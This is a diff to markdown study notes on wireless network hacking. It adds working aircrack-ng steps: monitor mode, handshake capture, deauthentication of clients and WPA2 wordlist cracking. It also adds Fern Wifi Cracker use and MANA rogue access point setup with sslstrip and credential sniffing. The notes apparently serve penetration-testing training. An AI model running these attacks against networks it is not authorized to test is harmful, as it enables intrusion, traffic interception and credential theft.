@@ -47,6 +47,8 @@ There are several different types of Wi-Fi attacks that attackers use to eavesdr
 * Evil Twin: A fraudulent wireless AP that pretends to be a legitimate one. 
 * Wi-Jacking Attack: Method used to gain access to an enormous number of wireless networks.
 
+(If any errors occur executing these commands, try to execute them many times)
+
 ### Find Hidden SSIDs ###
 #### Aircrack-ng ####
 `airmon-ng start <interface>` - To put the interface in monitor mode. If there are processes that could cause trouble: `airmon-ng check kill` and then start it again 
@@ -80,11 +82,33 @@ In order for us to be sure that we capture IV packets, let's generate ARP traffi
 
 ### Cracking a WPA Network ###
 #### Fern Wifi Cracker ####
+It is a wireless security auditing and attack software program that is able to crack and recover WEP/WPA keys and other network-based attacks on wired or wireless networks.
+
+`fern-wifi-cracker` > Select the interface > 'Scan for Access Points' > 'WPA' > Select the target AP > 'Browse' > Select a 'Password' file with a list of possible passwords > 'Attack'
 
 ### Cracking a WPA2 Network ###
 #### Aircrack-ng ####
-``` aircrack-ng -a2 -b <BSSID of the Victim in the Captured File> -w <Password Wordlist File Path> '<Wireshark .cap File with Captured WPA Initiation Traffic>' ```
+`airmon-ng start <interface>` - To put the interface in monitor mode. If there are processes that could cause trouble: `airmon-ng check kill` and then start it again
+
+`airodump-ng <interface>` - To display the nearby APs and clients (stations)
+
+First, we have to capture packets from the AP: `airodump-ng --bssid <BSSID of the target AP> -c <Channel of the AP> -w <Output dump filename> <interface>`.
+
+Then, we have to generate 'deauth' packets to deauthenticate the victim, therefore, forcing them to try to authenticate again and then capture those authentication messages: `aireplay-ng -0 <N of deauth packets - Ex. 11> -a <BSSID of the AP> -c <BSSID of the victim> <interface>`. When the victim tries to authenticate again, and those messages are captured from the 'airodump' terminal, it will display 'WPA Handshake: <BSSID of the AP>'. Now we have the desired WPA Initation traffic.
+
+``` aircrack-ng -a2 (-b) <BSSID of the AP> -w <Password wordlist file path> '<.cap file with captured WPA Initiation traffic>' ``` - To crack the WPA2 password
+
+#### Other WEP/WPA/WPA2 Cracking Tools ####
+* Elcomsoft Wireless Security Auditor (https://www.elcomsoft.com)
+* Portable Penetrator (https://www.secpoint.com)
+* WepCrackGui (https://sourceforge.net)
+* Pyrit (GitHub)
+* WepAttack (http://wepattack.sourceforge.net)
 
 ### Create a Rogue Access Point ###
 #### MANA Toolkit ####
+It can be downloaded: `git clone --depth 1 https://github.com/sensepost/mana`. Or in Windows at: `Module 16 Hacking Wireless Networks\GitHub Tools\`. Then, fetch the submodules: `git submodule init` and install them `git clone https://github.com/sensepost/hostapd-mana`, `git clone https://github.com/DanMcInerney/net-creds`, `git clone https://github.com/LeonardoNve/dns2proxy` and `git clone https://github.com/byt3bl33d3r/sslstrip2` > `make`, `make install`.
 
+Open '/etc/mana-toolkit/hostapd-mana.conf' and change the 'interface' to the corresponding one and the desired 'ssid'. Open '/usr/share/mana-toolkit/run-mana/start-nat-simple.sh' and change the 'phy' value to the interface value.
+
+To launch the MANA Rogue AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`.
